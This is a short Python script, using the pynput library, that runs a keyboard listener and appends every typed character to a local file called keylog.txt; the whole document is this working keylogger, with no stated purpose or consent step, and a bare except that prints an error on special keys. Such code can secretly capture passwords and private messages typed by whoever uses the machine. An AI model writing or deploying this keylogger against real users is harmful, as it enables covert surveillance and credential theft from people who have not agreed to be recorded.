from pynput import keyboard

def keyPressed(key):
    with open('keylog.txt','a') as keylogger:
        try:
            keylogger.write(key.char)
        except:
            print("Error occured")

listener = keyboard.Listener(on_press=keyPressed)
listener.start()
input()